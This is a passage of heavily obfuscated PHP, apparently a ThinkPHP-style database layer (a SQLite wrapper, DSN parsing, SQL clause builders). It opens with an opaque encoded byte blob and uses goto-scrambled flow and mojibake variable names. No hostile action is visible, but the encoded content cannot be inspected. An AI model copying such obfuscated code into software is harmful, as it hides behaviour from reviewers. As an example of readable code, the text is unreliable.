—0Ã')."\x34\x66\x7d\x9d\xc\xb6\x99\x99\x8c\xe5\xb1\xdf\x76\xce\x9b\xd\x95\x2d\x43\xc8\x3e\x70\x11\x2d\x5f\x93\xc6\xf\xc1\x32\xb9\x34\x3f\x63\x4\x1\xab\x24\x92\xd7\x61\xa1\x87\x39\x3d\xe5"."\100\107\200\16\352\326\304\66\34\274\127\342\314\24\30\303\377\136\6\266\34\104\342\105\302\112\165\252\47\307\164\172\254\142\117\246\132\260\16\10\365\334\164\35\273\202"."\312\173\307\140\166\72\61\146\154\345\104\121\214\347\363\303\217\53\210\13\100\342\5\214\234\231\220\35\235\117\274\144\105\53\211\272\241\22\227\57\212\264\332\166\346\77"."\x0\x24\xa0\xa8\x95\x24\xff\xef\x96\x2\x67\x8a\x71\x52\xc1\xe6\x32\xff\x75\xb3\xbc\x21\x41\x58\x29\xd8\x20\x8\x1b\x9a\xed\xb0\x59\x83\x67\xc0\x6\x6f\x2c\xde\xc2\xf8\x3\x40\xd6\xba"."\xf0\x73\x55\x5\xfa\x21\x6c\x44\x7c\x69\xe0\xb7\x65\xb4\x14\x14\x2f\xd3\x50\xb9\x69\xea\xb2\x55\x4e\x2a\x24\xe\xa0\x91\xa0\xb2\x87\x8a\x9e\xd1\x53\xec\x6d\x47\x3\x43\x14\x9\x3c\x5a".strrev('mí‰	KŸw=ƒpU,EHwÿd_!òğ»lŠLÁp”…FáÙ®ÍMÄ')."\xdb\xe3\x6a\x3f\xd3\x6e\xcc\x74\x31\xf1\xc7\x29\xd3\xf7\x7e\xd0\xa4\xa\x9a\x33\xc5\xc\xa2\x9\x26\xdc\xb\x97\xc6\xac\x7d\xb5\x15\xf\xb2\xf1\x32\xe6\x3a\xa4\xa1\x12\xe5\x73\x61\xc2"."\x5b\x44\xdc\x47\x83\xc0\x72\xc1\xdc\xf4\xce\xd3\x10\xc2\x2c\xa5\x56\xfc\x7d\x15\x74\x8d\x85\x2b\xa3\xd1\x5a\xb5\xac\x5b\xc1\xcd\x9b\x78\x2b\x4\x15\x24\x2e\x83\xfc\xa2\x91\x7e\x84\xb4".base64_decode('lyxc9Kw9ss/wNLC7P7JgAQKHTnhfSxO/rVdpg9QxF2CSLIIWCHttT7Ah4mN/lw==')."\x8d\xf6\x1f\xad\x73\x4e\xd3\x84\x4b\x64\x16\x71\x80\x3d\x44\x62\x11\xf\xc\xfb\x8b\x3c\x80\x9d\x12\xbd\xdb\x81\x20\xc3\x70\xb2\x79\x12\xaa\x87\x8c\x70\x71\x6d\xe\xfb\xab\x7c\x59\xe1"."\xd6\xac\xed\x89\x4f\x41\x55\x69\x7d\xbc\x33\x29\x36\xb\x7a\x13\xb0\x2d\x6b\x7a\x67\xf\x5e\x81\xc4\xe7\x27\x84\xf0\x23\xb7\x67\xf8\x9b\x72\xe2\xff\xcf\xaf\xf4\xfd\xff\x7a\x9c\xaf\xb2"."\234\52\225\55\57\270\65\20\6\227\162\143\203\202\157\103\254\320\264\365\303\272\105\36\45\306\22\14\165\130\102\44\300\27\34\334\173\134\266\167\114\135\314\52\221\172"."\237\240\116\51\144\172\140\42\303\67\211\362\24\224\364\55\57\200\221\335\354\251\251\102\201\374\207\26\55\310\107\371\115\336\314\214\32\357\56\160\0\7\247\40\140\365".base64_decode('BChwCXnJOH0CzAT1t+GmX3EoZkFWkpJF8c5YMEsFshJCieeeS8kHumZKqIhIOQ==')."\54\240\74\172\23\261\354\202\26\240\70\74\374\101\121\227\365\175\114\222\243\311\366\222\22\116\144\210\143\153\321\46\347\237\307\346\347\146\213\131\314\2\255\64\255\72".strrev('0‚'."\n".'jOd"ğ¿Ğ!šy†Yx<`Ğ‰§âPBêHØe~g'."\n".'Æ•ı¹c(ö')."\370\22\373\113\27\163\213\256\41\126\314\12\145\132\15\301\0\116\170\41\60\357\325\62\233\342\36\210\107\374\44\113\325\220\247\117\322\355\160\153\123\61\262\363\47\230"."\12\270\173\341\305\136\63\235\305\332\56\322\150\174\221\306\242\172\62\104\67\305\326\373\66\202\1\253\65\2\132\34\133\127\312\224\102\311\342\232\156\10\311\30\274\120"."\x5a\xf8\x30\x9c\x69\x19\x4d\xee\x7e\xd5\xee\x76\x15\x89\xc2\x58\xba\xb5\x8\xb9\xe4\xd8\x50\x4\x9\xa7\x6a\x80\xbd\x4d\x58\x9d\x29\xa3\x48\x4\xa6\x3e\x9c\xe8\x33\xce\xfc\x5c\xc8\x7a".base64_decode('LMd8XeZRqpwaEKJRLuoFBPzCa0V+fq0aRWNttqdXNunhlj1Xq0WWEA7x4gh3fA==')."\371\347\64\374\370\110\330\374\151\66\50\214\160\132\153\203\13\304\237\123\73\271\227\37\315\160\356\67\221\140\157\175\132\222\46\50\377\317\240\0\302\237\5\205\274\216"."\160\123\221\233\272\52\175\366\347\347\134\342\355\106\113\302\174\50\277\311\150\357\27\132\13\26\357\242\56\361\12\44\303\26\16\302\56\166\231\305\211\40\102\100\233\155"."\x6e\x8a\x82\xdb\xc8\x4\x64\x5e\xa5\xf5\xc2\x25\x4b\xc6\x26\x3\xa4\x41\x16\xf2\x4e\xb\xd4\x26\x14\x41\x75\x3\xdd\x9f\x6d\x51\x86\xf8\x3e\xa9\xf5\xd0\x4d\x94\xd8\x85\xb9\x55\x52\x1".strrev('HÓñÏ?j}iiÊHÇXÅ@¾³H]ĞG•9p±³tp•ÂáÈn@ñ8¡').base64_decode('o+miGuL89Iqt9WIGe89wDqNPNeNJQcjIj8yH63mDSioq3F57q+iY2kUvXkheew==')."\204\123\375\210\126\40\17\156\121\301\154\70\12\275\242\315\230\103\113\336\41\206\0\346\305\121\60\157\136\64\315\54\350\54\204\174\246\234\63\206\350\136\376\340\21\361"."\x3d\x51\xa0\xc3\x36\x21\x17\x27\x1d\x6a\x3c\xb\x26\xce\xaf\x8e\x60\x9c\x3d\x35\x92\xf7\xb\xb7\x82\x8b\xe9\xb6\x93\xd3\x42\xad\x28\x98\x78\xc8\x56\x14\x78\x19\x98\x78\xba\x2a\x40\x44"."\151\114\1\262\311\217\331\363\11\64\217\53\160\350\217\313\204\233\257\350\102\245\100\264\150\101\120\330\306\40\124\160\351\33\326\303\177\33\134\34\30\152\10\4\104\61"."\xfe\x56\xae\x60\x8d\x3a\xd2\x42\xd2\x73\x99\xee\xc\xbd\x81\x1\x4a\xe7\xe6\x5a\xd0\x1a\x93\xbd\x28\xcb\xaa\xcb\x2b\xcd\x8a\x9a\x99\x9c\x60\x66\x59\xd0\x38\xd6\x81\xde\x1b\xcf\x13\x51"."\x53\xf4\x49\xd\xd1\xae\x18\x8b\x23\x9a\xa9\xc6\x5\x3\x24\xfb\xb\xeb\x38\x9e\x56\x92\x12\x34\x6b\x36\xa5\x16\x17\xe3\x2d\x7\xcf\x5\xd4\x3e\x8\x44\xf8\x30\xae\x4d\xb6\x58\x59\xe3"."\215\235\250\321\361\151\132\35\74\114\145\47\50\120\156\162\340\375\22\107\303\47\337\35\60\56\242\145\321\157\255\146\232\224\222\0\301\36\245\104\334\33\334\364\34\202"."\xf1\x1\xf8\xe2\xc7\x25\x70\x14\x91\x6\x1f\xa1\x23\x22\x1b\xe8\x93\x9c\xeb\x41\x49\x32\xac\xe0\x58\x44\x6c\x2c\x1\x78\x32\xc0\x2\xe2\x9e\x46\xe\xe3\xea\x73\xb6\x13\x45\xe\x0\xd2"."\x61\x4c\xeb\xa7\xfe\xca\xe0\x6d\x4e\xde\x1e\xfe\x10\xad\x6c\xe7\xd0\xb8\x9\x0\xc1\x37\xd1\x94\x2\xdd\x99\x35\xdc\x38\xc6\x4d\x5c\xc1\x3a\x51\x19\x4e\xe2\x28\xa4\x2b\xdb\x69\xc9\x8e"."\35\344\63\23\302\237\53\201\50\35\171\21\330\105\44\322\27\101\147\251\276\131\376\160\44\234\27\325\342\11\207\333\202\41\57\366\50\231\27\215\162\11\126\53\171\121"._kodDe('MHsb1K/QjztqbQwdDkj8Ip+nNQlp0wovXeKb8PKkr0iPnc+8iXBJOrxEp4kplsI=')."\212\232\52\377\303\162\212\12\311\302\5\57\45\315\375\34\361\74\126\331\137\234\127\203\72\375\142\37\126\277\353\66\203\62\212\260\244\40\150\201\322\114\312\16\145\11"."\24\172\330\144\213\233\161\301\250\103\232\315\320\35\237\12\273\54\107\311\2\34\55\26\104\142\4\44\24\167\127\4\50\55\70\142\242\142\64\137\121\217\142\371\210\300".base64_decode('lk6jLwt1aTFBEY+FEnL7ioyxYHaEv0n0/wFepuNnLp0AAA==').""."".base64_decode('').""."", 10, -8))); goto e°«ŞÒ…°; d¹ïÛ†¾­ƒ: class DbSqlite3 extends DbSqlite3Base { public function query($d„Üöê¹À) { $D¹Š½ƒ¨‘˜ =& $_SERVER[Ç³Íß¦Ó]; if (!CacheLock::fileLock($D¹Š½ƒ¨‘˜[9])) { return !1; } $D…™ÓÛÀÃñ = parent::query($d„Üöê¹À); CacheLock::fileUnLock($D¹Š½ƒ¨‘˜[9]); return $D…™ÓÛÀÃñ; } public function execute($eùñÙÅ‹áæ) { $FÒµ—ª¶ =& $_SERVER[Ç³Íß¦Ó]; if (!CacheLock::fileLock($FÒµ—ª¶[9])) { return !1; } $dª‰éìÃ³ = parent::execute($eùñÙÅ‹áæ); CacheLock::fileUnLock($FÒµ—ª¶[9]); return $dª‰éìÃ³; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\x71" => "\74\x3e", "\147\x74" => "\x3e", "\x65\147\x74" => "\x3e\x3d", "\154\164" => "\x3c", "\145\x6c\164" => "\74\75", "\156\157\x74\154\x69\153\x65" => "\x4e\x4f\124\x20\114\x49\113\x45", "\x6c\x69\x6b\x65" => "\114\111\113\x45", "\x69\156" => "\111\116", "\156\x6f\x74\x69\x6e" => "\116\x4f\124\40\111\116", "\x6e\157\x74\40\x69\x6e" => "\116\x4f\x54\40\x49\116", "\142\145\164\167\x65\x65\156" => "\x42\105\x54\127\105\105\x4e", "\156\157\164\x62\145\164\x77\145\145\156" => "\116\x4f\124\40\x42\x45\124\x57\105\x45\x4e", "\x6e\157\x74\x20\x62\x65\164\167\145\x65\x6e" => "\116\x4f\x54\x20\102\x45\124\127\x45\105\x4e"); protected $selectSql = "\123\105\114\105\103\124\45\104\111\123\124\111\116\x43\124\45\x20\45\106\111\105\x4c\x44\x25\40\x46\122\117\x4d\40\x25\124\101\102\114\105\x25\45\x4a\x4f\x49\x4e\45\x25\127\110\x45\x52\105\x25\x25\x47\122\117\125\120\x25\x25\x48\101\x56\111\x4e\x47\x25\x25\x4f\x52\x44\105\122\x25\45\114\x49\x4d\111\x54\x25\40\x25\125\116\x49\x4f\116\45\x25\x43\117\x4d\x4d\105\116\124\45"; protected $bind = array(); public static function getInstance() { $däÆÛß¡ìì = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ç³Íß¦Ó][919], $däÆÛß¡ìì); } public function factory($A£Ÿ†‚Š­ = '') { goto b´İƒµè×„; b´İƒµè×„: $CšÏ§ÆÙÑÊ =& $_SERVER[Ç³Íß¦Ó]; $A£Ÿ†‚Š­ = $this->parseConfig($A£Ÿ†‚Š­); if (empty($A£Ÿ†‚Š­[$CšÏ§ÆÙÑÊ[920]])) { think_exception(think_lang($CšÏ§ÆÙÑÊ[921])); } goto EòŒ–åÏÒÛ; cñ’…Å¼§È: return $A‘ÒñÜ˜ÕÆ; goto D”äØŒ‡¤; EòŒ–åÏÒÛ: $this->dbType = ucwords(strtolower($A£Ÿ†‚Š­[$CšÏ§ÆÙÑÊ[920]])); $A™»›õ¥º = $CšÏ§ÆÙÑÊ[922] . $this->dbType; if (class_exists($A™»›õ¥º)) { $A‘ÒñÜ˜ÕÆ = new $A™»›õ¥º($A£Ÿ†‚Š­); if ($CšÏ§ÆÙÑÊ[756] != strtolower($A£Ÿ†‚Š­[$CšÏ§ÆÙÑÊ[920]])) { $A‘ÒñÜ˜ÕÆ->dbType = strtoupper($this->dbType); } else { $A‘ÒñÜ˜ÕÆ->dbType = $this->_getDsnType($A£Ÿ†‚Š­[$CšÏ§ÆÙÑÊ[875]]); } } else { think_exception(think_lang($CšÏ§ÆÙÑÊ[923]) . $CšÏ§ÆÙÑÊ[924] . $A™»›õ¥º); } goto cñ’…Å¼§È; D”äØŒ‡¤: } public function __call($A’°¦ÕÌò, $AìÃ‹ãÇ¼·) { if (method_exists($this, $A’°¦ÕÌò)) { return call_user_func_array(array($this, $A’°¦ÕÌò), $AìÃ‹ãÇ¼·); } } protected function _getDsnType($döÄôøŠ³Ş) { $FÃößğßî• = explode($_SERVER[Ç³Íß¦Ó][4], $döÄôøŠ³Ş); $e¦®“ËÆ± = strtoupper(trim($FÃößğßî•[0])); return $e¦®“ËÆ±; } private function parseConfig($d…À”ùäñ = '') { $a¤Ë¨é õÌ =& $_SERVER[Ç³Íß¦Ó]; if (!empty($d…À”ùäñ) && is_string($d…À”ùäñ)) { $d…À”ùäñ = $this->parseDSN($d…À”ùäñ); } elseif (is_array($d…À”ùäñ)) { $d…À”ùäñ = array_change_key_case($d…À”ùäñ); $d…À”ùäñ = array($a¤Ë¨é õÌ[920] => $d…À”ùäñ[$a¤Ë¨é õÌ[755]], $a¤Ë¨é õÌ[848] => $d…À”ùäñ[$a¤Ë¨é õÌ[925]], $a¤Ë¨é õÌ[849] => $d…À”ùäñ[$a¤Ë¨é õÌ[926]], $a¤Ë¨é õÌ[846] => $d…À”ùäñ[$a¤Ë¨é õÌ[927]], $a¤Ë¨é õÌ[847] => $d…À”ùäñ[$a¤Ë¨é õÌ[928]], $a¤Ë¨é õÌ[17] => $d…À”ùäñ[$a¤Ë¨é õÌ[929]], $a¤Ë¨é õÌ[875] => $d…À”ùäñ[$a¤Ë¨é õÌ[757]], $a¤Ë¨é õÌ[13] => isset($d…À”ùäñ[$a¤Ë¨é õÌ[930]]) ? $d…À”ùäñ[$a¤Ë¨é õÌ[930]] : array()); } elseif (empty($d…À”ùäñ)) { if (think_config($a¤Ë¨é õÌ[931]) && $a¤Ë¨é õÌ[756] != strtolower(think_config($a¤Ë¨é õÌ[932]))) { $d…À”ùäñ = $this->parseDSN(think_config($a¤Ë¨é õÌ[931])); } else { $d…À”ùäñ = array($a¤Ë¨é õÌ[920] => think_config($a¤Ë¨é õÌ[932]), $a¤Ë¨é õÌ[848] => think_config($a¤Ë¨é õÌ[933]), $a¤Ë¨é õÌ[849] => think_config($a¤Ë¨é õÌ[934]), $a¤Ë¨é õÌ[846] => think_config($a¤Ë¨é õÌ[935]), $a¤Ë¨é õÌ[847] => think_config($a¤Ë¨é õÌ[936]), $a¤Ë¨é õÌ[17] => think_config($a¤Ë¨é õÌ[243]), $a¤Ë¨é õÌ[875] => think_config($a¤Ë¨é õÌ[931]), $a¤Ë¨é õÌ[13] => think_config($a¤Ë¨é õÌ[937])); } } return $d…À”ùäñ; } protected function initConnect($AÂš½ƒ–¸ = true) { if (1 == think_config($_SERVER[Ç³Íß¦Ó][18])) { $this->_linkID = $this->multiConnect($AÂš½ƒ–¸); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $dÛ£Œˆ† => $C„ƒ¶Çï©¾) { $this->_linkID = $C„ƒ¶Çï©¾; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($C¯ö¯Îç¡Ã = false) { goto AòÔÛÃ•Ş; AòÔÛÃ•Ş: $b´…İŞµ ‹ =& $_SERVER[Ç³Íß¦Ó]; static $a‰¯×®Á©ç = array(); static $eªªœÌ‘¿ = -1; goto bŞÙŸ¨Æ¢; bŞÙŸ¨Æ¢: if (empty($a‰¯×®Á©ç)) { foreach ($this->config as $C¯¹Á©ã => $D¹­´°¾ÈÀ) { $a‰¯×®Á©ç[$C¯¹Á©ã] = explode($b´…İŞµ ‹[47], $D¹­´°¾ÈÀ); } } if (think_config($b´…İŞµ ‹[938])) { if ($C¯ö¯Îç¡Ã) { $eÑğêÔ×îĞ = floor(mt_rand(0, think_config($b´…İŞµ ‹[939]) - 1)); $eªªœÌ‘¿ = $eÑğêÔ×îĞ; } else { if (is_numeric(think_config($b´…İŞµ ‹[940]))) { $eÑğêÔ×îĞ = think_config($b´…İŞµ ‹[940]); } else { $eÑğêÔ×îĞ = floor(mt_rand(think_config($b´…İŞµ ‹[939]), count($a‰¯×®Á©ç[$b´…İŞµ ‹[846]]) - 1)); } } } else { $eÑğêÔ×îĞ = floor(mt_rand(0, count($a‰¯×®Á©ç[$b´…İŞµ ‹[846]]) - 1)); $eªªœÌ‘¿ = $eÑğêÔ×îĞ; } $eÑğêÔ×îĞ = $eªªœÌ‘¿ !== -1 ? $eªªœÌ‘¿ : $eÑğêÔ×îĞ; goto e³ „‡˜¹—; e³ „‡˜¹—: $Cñ½Ş³é®‡ = array($b´…İŞµ ‹[848] => isset($a‰¯×®Á©ç[$b´…İŞµ ‹[848]][$eÑğêÔ×îĞ]) ? $a‰¯×®Á©ç[$b´…İŞµ ‹[848]][$eÑğêÔ×îĞ] : $a‰¯×®Á©ç[$b´…İŞµ ‹[848]][0], $b´…İŞµ ‹[849] => isset($a‰¯×®Á©ç[$b´…İŞµ ‹[849]][$eÑğêÔ×îĞ]) ? $a‰¯×®Á©ç[$b´…İŞµ ‹[849]][$eÑğêÔ×îĞ] : $a‰¯×®Á©ç[$b´…İŞµ ‹[849]][0], $b´…İŞµ ‹[846] => isset($a‰¯×®Á©ç[$b´…İŞµ ‹[846]][$eÑğêÔ×îĞ]) ? $a‰¯×®Á©ç[$b´…İŞµ ‹[846]][$eÑğêÔ×îĞ] : $a‰¯×®Á©ç[$b´…İŞµ ‹[846]][0], $b´…İŞµ ‹[847] => isset($a‰¯×®Á©ç[$b´…İŞµ ‹[847]][$eÑğêÔ×îĞ]) ? $a‰¯×®Á©ç[$b´…İŞµ ‹[847]][$eÑğêÔ×îĞ] : $a‰¯×®Á©ç[$b´…İŞµ ‹[847]][0], $b´…İŞµ ‹[17] => isset($a‰¯×®Á©ç[$b´…İŞµ ‹[17]][$eÑğêÔ×îĞ]) ? $a‰¯×®Á©ç[$b´…İŞµ ‹[17]][$eÑğêÔ×îĞ] : $a‰¯×®Á©ç[$b´…İŞµ ‹[17]][0], $b´…İŞµ ‹[875] => isset($a‰¯×®Á©ç[$b´…İŞµ ‹[875]][$eÑğêÔ×îĞ]) ? $a‰¯×®Á©ç[$b´…İŞµ ‹[875]][$eÑğêÔ×îĞ] : $a‰¯×®Á©ç[$b´…İŞµ ‹[875]][0], $b´…İŞµ ‹[13] => isset($a‰¯×®Á©ç[$b´…İŞµ ‹[13]][$eÑğêÔ×îĞ]) ? $a‰¯×®Á©ç[$b´…İŞµ ‹[13]][$eÑğêÔ×îĞ] : $a‰¯×®Á©ç[$b´…İŞµ ‹[13]][0]); return $this->connect($Cñ½Ş³é®‡, $eÑğêÔ×îĞ); goto EÃœè‹·; EÃœè‹·: } public function parseDSN($CÃ¶®ƒ¥§±) { $BğÌßÑ½©ë =& $_SERVER[Ç³Íß¦Ó]; if (empty($CÃ¶®ƒ¥§±)) { return !1; } $F£òõ› ß¦ = parse_url($CÃ¶®ƒ¥§±); if ($F£òõ› ß¦[$BğÌßÑ½©ë[174]]) { $AŞªˆïéøã = array($BğÌßÑ½©ë[920] => $F£òõ› ß¦[$BğÌßÑ½©ë[174]], $BğÌßÑ½©ë[848] => isset($F£òõ› ß¦[$BğÌßÑ½©ë[561]]) ? $F£òõ› ß¦[$BğÌßÑ½©ë[561]] : $BğÌßÑ½©ë[33], $BğÌßÑ½©ë[849] => isset($F£òõ› ß¦[$BğÌßÑ½©ë[941]]) ? $F£òõ› ß¦[$BğÌßÑ½©ë[941]] : $BğÌßÑ½©ë[33], $BğÌßÑ½©ë[846] => isset($F£òõ› ß¦[$BğÌßÑ½©ë[175]]) ? $F£òõ› ß¦[$BğÌßÑ½©ë[175]] : $BğÌßÑ½©ë[33], $BğÌßÑ½©ë[847] => isset($F£òõ› ß¦[$BğÌßÑ½©ë[176]]) ? $F£òõ› ß¦[$BğÌßÑ½©ë[176]] : $BğÌßÑ½©ë[33], $BğÌßÑ½©ë[17] => isset($F£òõ› ß¦[$BğÌßÑ½©ë[76]]) ? substr($F£òõ› ß¦[$BğÌßÑ½©ë[76]], 1) : $BğÌßÑ½©ë[33]); } else { preg_match($BğÌßÑ½©ë[942], trim($CÃ¶®ƒ¥§±), $Bë”Ä‡…—Õ); $AŞªˆïéøã = array($BğÌßÑ½©ë[920] => $Bë”Ä‡…—Õ[1], $BğÌßÑ½©ë[848] => $Bë”Ä‡…—Õ[2], $BğÌßÑ½©ë[849] => $Bë”Ä‡…—Õ[3], $BğÌßÑ½©ë[846] => $Bë”Ä‡…—Õ[4], $BğÌßÑ½©ë[847] => $Bë”Ä‡…—Õ[5], $BğÌßÑ½©ë[17] => $Bë”Ä‡…—Õ[6]); } $AŞªˆïéøã[$BğÌßÑ½©ë[875]] = $BğÌßÑ½©ë[33]; return $AŞªˆïéøã; } protected function debug() { $bÍá•°Òœ =& $_SERVER[Ç³Íß¦Ó]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bÍá•°Òœ[943]; if (think_config($bÍá•°Òœ[944])) { think_status($bÍá•°Òœ[945]); think_trace($this->queryStr . $bÍá•°Òœ[946] . think_status($bÍá•°Òœ[20], $bÍá•°Òœ[945], 6) . $bÍá•°Òœ[947], $bÍá•°Òœ[33], $bÍá•°Òœ[948]); } } protected function parseLock($dÅ‹Ø£Ê£„ = false) { $FˆôÛö›¾— =& $_SERVER[Ç³Íß¦Ó]; if (!$dÅ‹Ø£Ê£„) { return $FˆôÛö›¾—[33]; } if ($FˆôÛö›¾—[877] == $this->dbType) { return $FˆôÛö›¾—[949]; } return $FˆôÛö›¾—[950]; } protected function parseSet($Cî·œµƒ¶ö) { $F‡¤®›©« =& $_SERVER[Ç³Íß¦Ó]; foreach ($Cî·œµƒ¶ö as $fß×ğŒÚ‡å => $E©ŞêòëÑ¿) { if (is_array($E©ŞêòëÑ¿) && $F‡¤®›©«[294] == $E©ŞêòëÑ¿[0]) { $eÏÏ•á±öŠ[] = $this->parseKey($fß×ğŒÚ‡å) . $F‡¤®›©«[951] . $E©ŞêòëÑ¿[1]; } elseif (is_scalar($E©ŞêòëÑ¿) || is_null($E©ŞêòëÑ¿)) { $eÏÏ•á±öŠ[] = $this->parseKey($fß×ğŒÚ‡å) . $F‡¤®›©«[951] . $this->parseValue($E©ŞêòëÑ¿); } } return $F‡¤®›©«[952] . implode($F‡¤®›©«[47], $eÏÏ•á±öŠ); } protected function bindParam($DŞŠœ¯ğ³, $aİî¡äí¹) { $this->bind[$_SERVER[Ç³Íß¦Ó][4] . $DŞŠœ¯ğ³] = $aİî¡äí¹; } protected function parseBind($B‘ï¢¾‚ö) { $B‘ï¢¾‚ö = array_merge($this->bind, $B‘ï¢¾‚ö); $this->bind = array(); return $B‘ï¢¾‚ö; } function parseKey(&$C¸ÕÌ …•Š, $E¦É÷éÄ° = true) { if ($E¦É÷éÄ°) { $C¸ÕÌ …•Š = $this->parseKeyCheck($C¸ÕÌ …•Š); } return $C¸ÕÌ …•Š; } function parseKeyCheck($F‘—¹‹Œ¯) { $BµÒ¸Ÿ…Û¿ =& $_SERVER[Ç³Íß¦Ó]; $F‘—¹‹Œ¯ = trim($F‘—¹‹Œ¯); if (!preg_match($BµÒ¸Ÿ…Û¿[953], $F‘—¹‹Œ¯)) { think_exception($BµÒ¸Ÿ…Û¿[954] . $F‘—¹‹Œ¯); } return $F‘—¹‹Œ¯; } protected function parseValue($eİÅ©ñÆ) { $bø‰»¾®Ä¼ =& $_SERVER[Ç³Íß¦Ó]; if (is_string($eİÅ©ñÆ)) { $eİÅ©ñÆ = $bø‰»¾®Ä¼[916] . $this->escapeString($eİÅ©ñÆ) . $bø‰»¾®Ä¼[916]; } elseif (isset($eİÅ©ñÆ[0]) && is_string($eİÅ©ñÆ[0]) && strtolower($eİÅ©ñÆ[0]) == $bø‰»¾®Ä¼[294]) { $eİÅ©ñÆ = $this->escapeString($eİÅ©ñÆ[1]); } elseif (is_array($eİÅ©ñÆ)) { $eİÅ©ñÆ = array_map(array($this, $bø‰»¾®Ä¼[917]), $eİÅ©ñÆ); } elseif (is_bool($eİÅ©ñÆ)) { $eİÅ©ñÆ = $eİÅ©ñÆ ? $bø‰»¾®Ä¼[87] : $bø‰»¾®Ä¼[495]; } elseif (is_null($eİÅ©ñÆ)) { $eİÅ©ñÆ = $bø‰»¾®Ä¼[103]; } return $eİÅ©ñÆ; } protected function parseField($b¸«Ú„†´÷) { $DƒŸšëæÙ =& $_SERVER[Ç³Íß¦Ó]; if (is_string($b¸«Ú„†´÷) && strpos($b¸«Ú„†´÷, $DƒŸšëæÙ[47])) { $b¸«Ú„†´÷ = explode($DƒŸšëæÙ[47], $b¸«Ú„†´÷); } if (is_array($b¸«Ú„†´÷)) { $Eª×öª™¡ = array(); foreach ($b¸«Ú„†´÷ as $B‘ƒñ÷È => $AŸáˆÇ¹ÑŒ) { if (!is_numeric($B‘ƒñ÷È)) { $Eª×öª™¡[] = $this->parseKey($B‘ƒñ÷È, !1) . $DƒŸšëæÙ[955] . $this->parseKey($AŸáˆÇ¹ÑŒ); } else { $Eª×öª™¡[] = $this->parseKey($AŸáˆÇ¹ÑŒ); } } $CáÇò÷ò“İ = implode($DƒŸšëæÙ[47], $Eª×öª™¡); } elseif (is_string($b¸«Ú„†´÷) && !empty($b¸«Ú„†´÷)) { $CáÇò÷ò“İ = $b¸«Ú„†´÷; } else { $CáÇò÷ò“İ = $DƒŸšëæÙ[182]; } return $CáÇò÷ò“İ; } protected function parseTable($e†–Æ©) { $cÖèŞØùÈ =& $_SERVER[Ç³Íß¦Ó]; if (is_array($e†–Æ©)) { $CÚå„é™’ = array(); foreach ($e†–Æ© as $fË¸ªŞ‹ÆÈ => $b©õâ»ÒÊ) { if (!is_numeric($fË¸ªŞ‹ÆÈ)) { $CÚå„é™’[] = $this->parseKey($fË¸ªŞ‹ÆÈ) . $cÖèŞØùÈ[50] . $this->parseKey($b©õâ»ÒÊ); } else { $CÚå„é™’[] = $this->parseKey($fË¸ªŞ‹ÆÈ); } } $e†–Æ© = $CÚå„é™’; } elseif (is_string($e†–Æ©)) { if (strstr($e†–Æ©, $cÖèŞØùÈ[50])) { return $e†–Æ©; } $e†–Æ© = explode($cÖèŞØùÈ[47], $e†–Æ©); array_walk($e†–Æ©, array($this, $cÖèŞØùÈ[866])); } return $cÖèŞØùÈ[860] . trim(implode($cÖèŞØùÈ[956], $e†–Æ©), $cÖèŞØùÈ[381]) . $cÖèŞØùÈ[860]; } protected function parseWhere($dÔ±êà‚Ø) { $C”¡Î°Œ•í =& $_SERVER[Ç³Íß¦Ó]; $có¹œ•ƒ¶Â = $C”¡Î°Œ•í[33]; if (is_string($dÔ±êà‚Ø)) { $có¹œ•ƒ¶Â = $dÔ±êà‚Ø; } else { $AÒè‰Úõõ‹ = isset($dÔ±êà‚Ø[$C”¡Î°Œ•í[957]]) ? strtoupper($dÔ±êà‚Ø[$C”¡Î°Œ•í[957]]) : $C”¡Î°Œ•í[33]; if (in_array($AÒè‰Úõõ‹, array($C”¡Î°Œ•í[958], $C”¡Î°Œ•í[959], $C”¡Î°Œ•í[960]))) { $AÒè‰Úõõ‹ = $C”¡Î°Œ•í[50] . $AÒè‰Úõõ‹ . $C”¡Î°Œ•í[50]; unset($dÔ±êà‚Ø[$C”¡Î°Œ•í[957]]); } else { $AÒè‰Úõõ‹ = $C”¡Î°Œ•í[961]; } foreach ($dÔ±êà‚Ø as $d¬„ğ‰”…ç => $BÖ¸Î×¢ÀÓ) { $có¹œ•ƒ¶Â .= $C”¡Î°Œ•í[274]; if (is_numeric($d¬„ğ‰”…ç)) { $d¬„ğ‰”…ç = $C”¡Î°Œ•í[962]; } if (0 === strpos($d¬„ğ‰”…ç, $C”¡Î°Œ•í[71])) { $có¹œ•ƒ¶Â .= $this->parseThinkWhere($d¬„ğ‰”…ç, $BÖ¸Î×¢ÀÓ); } else { if (!preg_match($C”¡Î°Œ•í[963], trim($d¬„ğ‰”…ç))) { think_exception(think_lang($C”¡Î°Œ•í[964]) . $C”¡Î°Œ•í[4] . $d¬„ğ‰”…ç); } $e·†—£Áƒ¾ = is_array($BÖ¸Î×¢ÀÓ) && isset($BÖ¸Î×¢ÀÓ[$C”¡Î°Œ•í[965]]); $d¬„ğ‰”…ç = trim($d¬„ğ‰”…ç); if (strpos($d¬„ğ‰”…ç, $C”¡Î°Œ•í[280])) { $c¸Ì‹ªÔÊ = explode($C”¡Î°Œ•í[280], $d¬„ğ‰”…ç); $e¬Ô¹ÚĞª« = array(); foreach ($c¸Ì‹ªÔÊ as $E‡àö†×º => $BîÁ‘ŞÖ) { $Bê„Ö†ñßç = $e·†—£Áƒ¾ ? $BÖ¸Î×¢ÀÓ[$E‡àö†×º] : $BÖ¸Î×¢ÀÓ; $e¬Ô¹ÚĞª«[] = $C”¡Î°Œ•í[257] . $this->parseWhereItem($this->parseKey($BîÁ‘ŞÖ), $Bê„Ö†ñßç) . $C”¡Î°Œ•í[865]; } $có¹œ•ƒ¶Â .= implode($C”¡Î°Œ•í[966], $e¬Ô¹ÚĞª«); } elseif 